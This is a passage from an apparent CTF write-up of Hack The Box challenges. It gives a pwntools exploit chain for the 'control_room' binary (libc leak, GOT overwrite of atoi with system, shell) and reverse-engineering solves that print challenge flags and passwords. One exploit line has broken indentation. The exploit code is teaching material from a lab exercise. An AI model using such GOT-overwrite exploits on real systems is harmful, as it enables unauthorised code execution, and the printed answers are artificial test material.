<p>Only accessible if (curr_user + 0x100) &#x3D;&#x3D; 0) i.e Captain, Used to set new role.</p>
<p>All in once :</p>
<ol>
<li><strong>Off-By-One</strong> : We analyzed the <code>user_edit</code> function where we can manage to change the role to 0 i.e. Captain thus we would have changed our role to Captain 0 before menu function </li>
<li><strong>Out-Of-Bound</strong>: bug in <code>configure_engine</code> where we can OOB Write for addresses before the address of <code>engine</code></li>
<li><strong>Uninitialised Data Access</strong>: bug in <code>change_route</code> possibly get the leak of libc in <code>view_route</code> function.</li>
</ol>
<p><em><strong>Exploitation strategies</strong></em> :</p>
<ul>
<li>Need to leak libc using UDA bug in <code>change_route</code> function where will somehow pass the <code>scanf</code> function anticipating to we’ll get addr from libc </li>
<li>Calculate the base address of libc with leaked address </li>
<li>overwrite the GOT of leakd libc func to <code>system</code> function from libc using OOB write bug on configure_engine  </li>
<li>pass the “sh” argument and gain the shell</li>
</ul>
<h4 id="Leaking-the-libc-address"><a href="#Leaking-the-libc-address" class="headerlink" title="Leaking the libc address"></a>Leaking the libc address</h4><p><img src="/imgs/post3/pwn/control_room_libc-leak1.png" alt="control_room_libc-leak.png1"></p>
<p>verifying this address by converting into hex we indeed able to leak libc address we can confirm it using gdb using </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = <span class="string">&quot;./control_room&quot;</span> </span><br><span class="line">elf = context.binary = ELF(elf, checksec=<span class="literal">False</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&quot;./ld-linux-x86-64.so.2&quot;)</span></span><br><span class="line"></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        p = process([elf.path])</span><br><span class="line">        <span class="keyword">if</span> args.PLT_DEBUG:</span><br><span class="line">            gdb.attach(p, gdbscript=gdbscript)</span><br><span class="line">            pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(remote_url, remote_port)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">p = conn()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Trigger the off-by-one bug</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;256&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Leak stack UDA, which contains libc address</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;ay&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/imgs/post3/pwn/control_room_libc-leak2.png" alt="control_room_libc-leak2"></p>
<p>addr from Coordinates 1 Longitude point to libc function atoi+20 </p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x <span class="number">140611594499668</span></span><br><span class="line"><span class="number">0</span>x7fe2b0243654 &lt;atoi+<span class="number">20</span>&gt;:       <span class="number">0</span>x08c48348</span><br></pre></td></tr></table></figure>

<p>so calculate the libc base we have to subtract it to libc.symbols.atoi+20</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = <span class="string">&quot;./control_room&quot;</span> </span><br><span class="line">elf = context.binary = ELF(elf, checksec=<span class="literal">False</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&quot;./ld-linux-x86-64.so.2&quot;)</span></span><br><span class="line"></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        p = process([elf.path])</span><br><span class="line">        <span class="keyword">if</span> args.PLT_DEBUG:</span><br><span class="line">            gdb.attach(p, gdbscript=gdbscript)</span><br><span class="line">            pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(remote_url, remote_port)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">p = conn()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Trigger the off-by-one bug</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;256&#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Leak stack UDA, which contains libc address</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;ay&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Latitude  : &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Latitude  : &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Latitude  : &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Latitude  : &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Latitude  : &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Longitude : &#x27;</span>)</span><br><span class="line"></span><br><span class="line">leaked_libc = <span class="built_in">int</span>(p.recvline().strip())</span><br><span class="line">log.info(<span class="string">f&#x27;leaked_libc : <span class="subst">&#123;<span class="built_in">hex</span>(leaked_libc)&#125;</span>&#x27;</span>)</span><br><span class="line">libc.address = leaked_libc - (libc.symbols.atoi+<span class="number">20</span>)</span><br><span class="line">log.info(<span class="string">f&#x27;libc base = <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Got Shell?</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/imgs/post3/pwn/control_room_libc-leak.png" alt="control_room_libc-leak"></p>
<h4 id="Gaining-Shell"><a href="#Gaining-Shell" class="headerlink" title="Gaining Shell"></a>Gaining Shell</h4><p>now we have libc base all we need to do is overwrite the GOT <code>atoi</code> with <code>system</code><br>using OOB write bug on <code>configure_engine</code>.</p>
<p><em><strong>Note</strong></em> :</p>
<ul>
<li>We have to calculate the negative index value to find the correct offset to point to the <code>atoi</code> address in <code>configure_engine</code> func</li>
<li>The purpose of including the value “0x401150” is to prevent our program from crashing. This is because during the configuration of the engine, we are required to write two entries, but we only need one to overwrite “atoi” with “system”. Therefore, we need to ensure that the second value we provide will not cause the program to crash.</li>
</ul>
<h3 id="Final-Payload"><a href="#Final-Payload" class="headerlink" title="Final Payload:"></a>Final Payload:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">&quot;./control_room&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#ld = ELF(&quot;./ld-2.35.so&quot;)</span></span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        <span class="keyword">if</span> args.PLT_DEBUG:</span><br><span class="line">            gdb.attach(r, gdbscript=gdbscript)</span><br><span class="line">            pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(remote_url, remote_port)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">r = conn()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">configure_engine</span>(<span class="params">idx, v1, v2</span>):</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>) <span class="comment"># configure Engine</span></span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_printf:</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(v1).encode())</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(v2).encode())</span><br><span class="line"></span><br><span class="line">    r.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Trigger the off-by-one bug</span></span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;256&#x27;</span>)</span><br><span class="line">r.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Leak stack UDA, which contains libc address</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;ay&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Latitude  : &#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Latitude  : &#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Latitude  : &#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Latitude  : &#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Latitude  : &#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Longitude : &#x27;</span>)</span><br><span class="line"></span><br><span class="line">leaked_libc = <span class="built_in">int</span>(r.recvline().strip())</span><br><span class="line">log.info(<span class="string">f&#x27;leaked_libc : <span class="subst">&#123;<span class="built_in">hex</span>(leaked_libc)&#125;</span>&#x27;</span>)</span><br><span class="line">libc.address = leaked_libc - (libc.symbols.atoi+<span class="number">20</span>)</span><br><span class="line">log.info(<span class="string">f&#x27;libc base = <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Change role to technician</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">engines_addr = <span class="number">0x405120</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Change atoi to system</span></span><br><span class="line"></span><br><span class="line">configure_engine((exe.got[<span class="string">&#x27;atoi&#x27;</span>]-engines_addr) // <span class="number">0x10</span>, libc.symbols.system, <span class="number">0x401150</span>) </span><br><span class="line"><span class="comment"># r.sendline(b&#x27;sh&#x27;) # Trigger a shell</span></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/imgs/post3/pwn/control_room_shell.gif" alt="control_room_shell"></p>
<h1 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h1><h2 id="Shattered-tablet"><a href="#Shattered-tablet" class="headerlink" title="Shattered tablet"></a>Shattered tablet</h2><p>main func:</p>
<p><img src="/imgs/post3/rev/shattered_tablet.png" alt="shattered_tablet"></p>
<p>this challenge suppose to solve with angr but it did it manually using ChatGPT :p(as i didn’t know how to with angr) finding all variable’s value through this giant if condition is tremendious so i asked to CGPT to extract all these variable in descending order and create a list of their respective value and here is<br>result : </p>
<ul>
<li>local_48: [‘H’, ‘T’, ‘B’, ‘{‘, ‘b’, ‘r’, ‘0’, ‘k’]</li>
</ul>
<ul>
<li>local_40: [‘3’, ‘n’, ‘_’, ‘4’, ‘p’, ‘4’, ‘r’, ‘t’]</li>
<li>local_38: [‘,’, ‘n’, ‘3’, ‘v’, ‘e’, ‘r’, ‘_’, ‘t’]</li>
<li>local_30: [‘0’, ‘<em>‘, ‘b’, ‘3’, ‘</em>‘, ‘r’, ‘3’, ‘p’]</li>
<li>local_28: [‘4’, ‘1’, ‘r’, ‘3’, ‘d’, ‘}’]</li>
</ul>
<p>concatinating values in descending order of each variable and contatinating them create flag</p>
<p>HTB{br0k3n_4p4rt,n3ver_t0_b3_r3p41r3d}</p>
<blockquote>
<p>Edit:  later i learned basic of angr and symbolic execution and came across solution that could be solved using angr python module</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line"></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]  <span class="comment"># :string</span></span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  initial_state = project.factory.entry_state(</span><br><span class="line">    add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,</span><br><span class="line">                    angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  print_good_address = <span class="number">0x401359</span>  <span class="comment"># target address</span></span><br><span class="line">  simulation.explore(find=print_good_address)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line"></span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()).decode())</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="Needle-in-a-Haystack"><a href="#Needle-in-a-Haystack" class="headerlink" title="Needle in a Haystack"></a>Needle in a Haystack</h2><p>like name like challenge - flag in a file, running strings command on file </p>
<p><img src="/imgs/post3/rev/haystack.png" alt="haystack"></p>
<h2 id="Hunting-License"><a href="#Hunting-License" class="headerlink" title="Hunting License"></a>Hunting License</h2><p>running the binary </p>
<p><img src="/imgs/post3/rev/hunting_lic1.png" alt="hunting_lic1"></p>
<p>asking for the first password that says not even hidden lets check it using strigns command </p>
<p><img src="/imgs/post3/rev/hunting_lic2.png" alt="hunting_lic2"></p>
<p>we got first pass feeding this as first password </p>
<p><img src="/imgs/post3/rev/hunting_lic3.png" alt="hunting_lic3.png"></p>
<p>now for second password, entering some promising string while strings command didn’t work</p>
<p>examining the <code>exam</code> function inside the main function</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">exam</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  undefined8 local_38;</span><br><span class="line">  undefined8 local_30;</span><br><span class="line">  undefined local_28;</span><br><span class="line">  undefined8 local_1c;</span><br><span class="line">  undefined4 local_14;</span><br><span class="line">  <span class="type">char</span> *local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = (<span class="type">char</span> *)readline(</span><br><span class="line">                             <span class="string">&quot;Okay, first, a warmup - what\&#x27;s the first password? This one\&#x27;s not even hidden: &quot;</span></span><br><span class="line">                             );</span><br><span class="line">  iVar1 = <span class="built_in">strcmp</span>(local_10,<span class="string">&quot;PasswordNumeroUno&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Not even close!&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(local_10);</span><br><span class="line">  local_1c = <span class="number">0</span>;</span><br><span class="line">  local_14 = <span class="number">0</span>;</span><br><span class="line">  reverse(&amp;local_1c,t,<span class="number">0xb</span>);</span><br><span class="line">  local_10 = (<span class="type">char</span> *)readline(<span class="string">&quot;Getting harder - what\&#x27;s the second password? &quot;</span>);</span><br><span class="line">  iVar1 = <span class="built_in">strcmp</span>(local_10,(<span class="type">char</span> *)&amp;local_1c);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You\&#x27;ve got it all backwards...&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(local_10);</span><br><span class="line">  local_38 = <span class="number">0</span>;</span><br><span class="line">  local_30 = <span class="number">0</span>;</span><br><span class="line">  local_28 = <span class="number">0</span>;</span><br><span class="line">  xor(&amp;local_38,t2,<span class="number">0x11</span>,<span class="number">0x13</span>);</span><br><span class="line">  local_10 = (<span class="type">char</span> *)readline(<span class="string">&quot;Your final test - give me the third, and most protected, password: &quot;</span>)</span><br><span class="line">  ;</span><br><span class="line">  iVar1 = <span class="built_in">strcmp</span>(local_10,(<span class="type">char</span> *)&amp;local_38);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Failed at the final hurdle!&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(local_10);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>so basically we are asked for three password first is already visible to us and have also got from strings command.</p>
<p>and in case of second password check first <code>reverse</code> function is called and then result&#x2F;return value i.e local_1c of that function is being compared to user input i.e. local_10 </p>
<p>reverse func:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">reverse</span><span class="params">(<span class="type">long</span> res,<span class="type">long</span> unknown_value,ulong length)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; (ulong)(<span class="type">long</span>)i &lt; length; i = i + <span class="number">1</span>) &#123;</span><br><span class="line">    *(undefined *)(res + i) = *(undefined *)(unknown_value + (length - (<span class="type">long</span>)i) + <span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>unkown_value being revere and stored to <strong>res</strong> variable, inspecting in radare graph view </p>
<p><img src="/imgs/post3/rev/hunting_lic4.png" alt="hunting_lic4"></p>
<p>we can see the unkown_value i.e. ‘0wTdr0wss4P’.</p>
<p>its time for <code>xor</code> function ,where again local_10 var’s value is being compared to local_38 </p>
<p>xor function :</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">xor</span><span class="params">(<span class="type">long</span> param_1,<span class="type">long</span> param_2,ulong param_3,byte param_4)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> local_c;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (local_c = <span class="number">0</span>; (ulong)(<span class="type">long</span>)local_c &lt; param_3; local_c = local_c + <span class="number">1</span>) &#123;</span><br><span class="line">    *(byte *)(param_1 + local_c) = *(byte *)(param_2 + local_c) ^ param_4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>we need to have param_2 value in order to know the third password as param_4 is being xored to this value and then return back to compare with user input </p>
<p><img src="/imgs/post3/rev/hunting_lic5.png" alt="hunting_lic5"></p>
<p>as you can see above radare graph view this value ‘G{zawR}wUz}r\x7f222\x13’ is param_2 </p>
<h3 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">param_1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">param_2 =  <span class="string">&#x27;G&#123;zawR&#125;wUz&#125;r\x7f222\x13&#x27;</span><span class="comment">#&#x27;G&#123;zawR&#125;wUz&#125;r&#x27;</span></span><br><span class="line">param_3 = <span class="number">0x11</span></span><br><span class="line">param_4 = <span class="number">0x13</span></span><br><span class="line">rev_me = <span class="string">&#x27;0wTdr0wss4P&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">param_1, param_2, param_3, param_4</span>):</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(param_3):</span><br><span class="line">        <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(param_2):</span><br><span class="line">            result += <span class="built_in">chr</span>(<span class="built_in">ord</span>(param_2[i]) ^ param_4)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">result = xor(param_1, param_2, param_3, param_4)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nPassword2 : &quot;</span>,rev_me[::-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Password3 : &quot;</span>,result)</span><br></pre></td></tr></table></figure>


